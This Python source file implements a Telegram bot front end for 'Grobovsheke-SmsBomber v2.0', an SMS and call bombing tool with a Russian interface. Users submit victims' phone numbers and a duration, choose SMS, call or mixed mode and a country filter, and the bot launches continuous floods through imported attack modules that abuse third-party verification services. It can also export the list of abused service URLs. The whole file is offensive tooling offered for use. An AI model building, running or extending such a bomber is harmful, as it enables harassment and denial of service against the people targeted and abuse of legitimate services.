import os
import re
import json
import asyncio
import time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, FSInputFile
from dotenv import load_dotenv

load_dotenv()

bot = Bot(token=os.getenv("TELEGRAM_BOT_TOKEN") or "")
dp = Dispatcher()

active_attacks = {}
user_settings = {}
user_filters = {}  # country filter per user

# Настройки по умолчанию
def get_attack_type(user_id):
    return user_settings.get(user_id, {}).get("type", "MIX")

def set_attack_type(user_id, atype):
    if user_id not in user_settings:
        user_settings[user_id] = {}
    user_settings[user_id]["type"] = atype

def get_user_filter(user_id):
    return user_filters.get(user_id, "ALL")

def set_user_filter(user_id, country):
    user_filters[user_id] = country

# --- Клавиатуры ---
def main_keyboard():
    kb = [
        [KeyboardButton(text="💣 Атака"), KeyboardButton(text="⏹ Стоп")],
        [KeyboardButton(text="📱 SMS"), KeyboardButton(text="📞 Звонки"), KeyboardButton(text="🔀 MIX")],
        [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="🔧 Фильтр"), KeyboardButton(text="📤 Экспорт")],
        [KeyboardButton(text="📖 Помощь"), KeyboardButton(text="ℹ️ О проекте")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def filter_keyboard():
    kb = [
        [KeyboardButton(text="🌍 Все страны"), KeyboardButton(text="🇷🇺 Россия")],
        [KeyboardButton(text="🇺🇿 Узбекистан"), KeyboardButton(text="🇺🇦 Украина")],
        [KeyboardButton(text="◀️ Назад")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# --- Команды ---
@dp.message(Command("start"))
async def start_command(message: types.Message):
    uid = message.from_user.id
    atype = get_attack_type(uid)
    await message.answer(
        f"💣 **Grobovsheke-SmsBomber v2.0**\n\n"
        f"⚙️ Текущий тип: **{atype}**\n"
        f"🌍 Фильтр: **{get_user_filter(uid)}**\n\n"
        "Используй кнопки ниже 👇",
        reply_markup=main_keyboard()
    )

@dp.message(Command("help"))
async def help_command(message: types.Message):
    uid = message.from_user.id
    atype = get_attack_type(uid)
    await message.answer(
        f"📖 **Справка**\n\n"
        f"**Запуск атаки:**\n"
        f"`79123456789 5` — один номер на 5 мин\n"
        f"`+79123456789,+79876543210 3` — несколько номеров\n\n"
        f"**Режимы:**\n"
        f"📱 SMS — только сообщения\n"
        f"📞 Звонки — только звонки\n"
        f"🔀 MIX — всё сразу\n\n"
        f"**Фильтры:**\n"
        f"🌍 Все страны / 🇷🇺 Россия / 🇺🇿 Узбекистан / 🇺🇦 Украина\n\n"
        f"**Команды:**\n"
        f"📊 Статистика — состояние сервисов\n"
        f"📤 Экспорт — выгрузить список сервисов\n"
        f"/stop — остановить атаку\n\n"
        f"⚙️ Текущий: **{atype}** | Фильтр: **{get_user_filter(uid)}**"
    )

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    from Core.Attack.ServiceRegistry import get_summary_text, list_dead_services
    text = get_summary_text()
    dead = list_dead_services()
    if dead:
        text += "\n💀 **Мёртвые сервисы:**\n" + "\n".join(dead[:10])
    await message.answer(text, reply_markup=main_keyboard())

@dp.message(Command("reset"))
async def reset_command(message: types.Message):
    from Core.Attack.ServiceRegistry import reset_stats, enable_all
    reset_stats()
    enable_all()
    await message.answer("✅ Статистика сброшена, все сервисы включены")

@dp.message(Command("attack"))
async def attack_command(message: types.Message):
    args = message.text.split()
    if len(args) < 3:
        await message.answer(
            "❌ Введи номер(а) и время.\n"
            "Пример: `/attack 79123456789 5`\n"
            "Или несколько: `/attack +79123456789,+79876543210 3`"
        )
        return
    await run_attack(message, args[1], args[2])

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        active_attacks[user_id]["status"] = "stopped"
        try:
            from Core.Run import stop_attacks
            stop_attacks()
        except:
            pass
        await message.answer("⏹️ **Атака остановлена!**", reply_markup=main_keyboard())
    else:
        await message.answer("❌ Нет активных атак.", reply_markup=main_keyboard())

# --- Основная атака ---
async def run_attack(message: types.Message, numbers_str: str, minutes: str):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not minutes.isdigit():
        await message.answer("❌ Время должно быть числом!")
        return
    mins = int(minutes)
    if mins < 1 or mins > 10:
        await message.answer("❌ Время от 1 до 10 минут!")
        return

    # Парсим номера
    numbers = re.findall(r'\+?\d+', numbers_str)
    if not numbers:
        await message.answer("❌ Некорректный номер!")
        return
    
    cleaned = []
    for n in numbers:
        n = n.replace('+', '')
        if len(n) >= 10 and n.isdigit():
            cleaned.append(n)
    
    if not cleaned:
        await message.answer("❌ Номера должны быть цифрами (минимум 10 цифр)!")
        return

    attack_type = get_attack_type(user_id)

    # Останавливаем предыдущую атаку
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        try:
            from Core.Run import stop_attacks
            stop_attacks()
        except:
            pass

    from Core.Run import start_async_attacks
    from threading import Thread

    attack_id = int(time.time() * 1000)
    active_attacks[user_id] = {
        "number": "+" + " +".join(cleaned),
        "minutes": minutes,
        "status": "running",
        "type": attack_type,
        "id": attack_id,
        "numbers": cleaned,
    }

    # Callback для прогресса
    async def send_progress(text):
        try:
            await bot.send_message(chat_id, f"📊 **Прогресс:**\n{text}", parse_mode="Markdown")
        except:
            pass

    def progress_wrapper(text):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_progress(text))
            loop.close()
        except:
            pass

    def run(aid, nums):
        try:
            start_async_attacks(
                nums, minutes,
                attack_type=attack_type,
                stop_previous=True,
                progress_callback=progress_wrapper,
                country_filter=get_user_filter(user_id),
            )
            current = active_attacks.get(user_id, {})
            if current.get("id") != aid:
                return
            if current.get("status") == "stopped":
                return
            active_attacks[user_id]["status"] = "completed"
            
            # Итоговая статистика
            from Core.Attack.ServiceRegistry import get_summary_text
            final = f"✅ **Атака завершена!**\n\n"
            final += f"📱 Номера: `{' +'.join(nums)}`\n"
            final += f"⏱ Длительность: {minutes} мин.\n"
            final += f"🔀 Тип: {attack_type}\n\n"
            final += get_summary_text()
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_message(chat_id, final, parse_mode="Markdown"))
            loop.close()
        except Exception as e:
            current = active_attacks.get(user_id, {})
            if current.get("id") != aid:
                return
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(bot.send_message(
                chat_id,
                f"❌ **Ошибка:**\n`{e}`",
                parse_mode="Markdown"
            ))
            loop.close()

    Thread(target=run, args=(attack_id, cleaned), daemon=True).start()

    targets = " +".join(cleaned)
    await message.answer(
        f"✅ **Атака запущена!**\n"
        f"📱 Номера: `{targets}`\n"
        f"⏱ Длительность: {minutes} мин.\n"
        f"🔀 Тип: {attack_type}\n"
        f"💣 Сообщения идут непрерывно...",
        reply_markup=main_keyboard()
    )

# --- Обработка текста ---
@dp.message()
async def handle_text(message: types.Message):
    text = message.text.strip()
    uid = message.from_user.id
    
    if text == "💣 Атака":
        await message.answer(
            "Введи номер(а) и время атаки:\n\n"
            "Один номер: `79123456789 5`\n"
            "Несколько: `+79123456789,+79876543210 3`\n\n"
            f"⚙️ Текущий тип: **{get_attack_type(uid)}**\n"
            f"🌍 Фильтр: **{get_user_filter(uid)}**"
        )
    elif text in ("📱 SMS", "📞 Звонки", "🔀 MIX"):
        type_map = {"📱 SMS": "SMS", "📞 Звонки": "CALL", "🔀 MIX": "MIX"}
        atype = type_map[text]
        set_attack_type(uid, atype)
        await message.answer(f"✅ Тип атаки изменён на **{atype}**", reply_markup=main_keyboard())
    
    elif text == "📊 Статистика":
        await stats_command(message)
    
    elif text == "🔧 Фильтр":
        await message.answer(
            "🌍 **Выбери страну для фильтрации сервисов:**\n\n"
            f"Текущий фильтр: **{get_user_filter(uid)}**",
            reply_markup=filter_keyboard()
        )
    
    elif text in ("🌍 Все страны", "🇷🇺 Россия", "🇺🇿 Узбекистан", "🇺🇦 Украина"):
        filter_map = {
            "🌍 Все страны": "ALL",
            "🇷🇺 Россия": "RU",
            "🇺🇿 Узбекистан": "UZ",
            "🇺🇦 Украина": "UA",
        }
        country = filter_map[text]
        set_user_filter(uid, country)
        await message.answer(f"✅ Фильтр изменён на **{country}**", reply_markup=main_keyboard())
    
    elif text == "📤 Экспорт":
        from Core.Attack.Services import urls
        from Core.Attack.Services_Extra import extra_urls
        all_svc = urls('00000000000') + extra_urls('00000000000')
        
        # Сохраняем в JSON
        export = []
        for s in all_svc:
            export.append({
                "website": s['info']['website'],
                "attack": s['info']['attack'],
                "country": s['info']['country'],
                "method": s.get('method', 'post'),
                "url": s['url'],
            })
        
        with open('/tmp/services_export.json', 'w') as f:
            json.dump(export, f, indent=2, ensure_ascii=False)
        
        await message.answer(
            f"📤 **Экспорт сервисов**\n\n"
            f"Всего: {len(export)} сервисов\n"
            f"SMS: {sum(1 for s in export if s['attack']=='SMS')}\n"
            f"CALL: {sum(1 for s in export if s['attack']=='CALL')}",
            reply_markup=main_keyboard()
        )
        try:
            await message.answer_document(FSInputFile('/tmp/services_export.json'))
        except:
            await message.answer("Файл экспорта готов: `/tmp/services_export.json`")
    
    elif text == "◀️ Назад":
        await start_command(message)
    
    elif text == "⏹ Стоп":
        await stop_command(message)
    elif text == "📖 Помощь":
        await help_command(message)
    elif text == "ℹ️ О проекте":
        await start_command(message)
    else:
        # Проверяем, не ввёл ли пользователь номер(а) и время
        parts = text.split()
        if len(parts) == 2 and parts[1].isdigit():
            nums = re.findall(r'\+?\d+', parts[0])
            if nums:
                await run_attack(message, parts[0], parts[1])
            else:
                await message.answer(
                    "Используй кнопки ниже 👇",
                    reply_markup=main_keyboard()
                )
        else:
            await message.answer(
                "Используй кнопки ниже 👇\n"
                "Или введи `/attack <номер> <минуты>`",
                reply_markup=main_keyboard()
            )

async def start_telegram_bot():
    await dp.start_polling(bot, handle_signals=False)
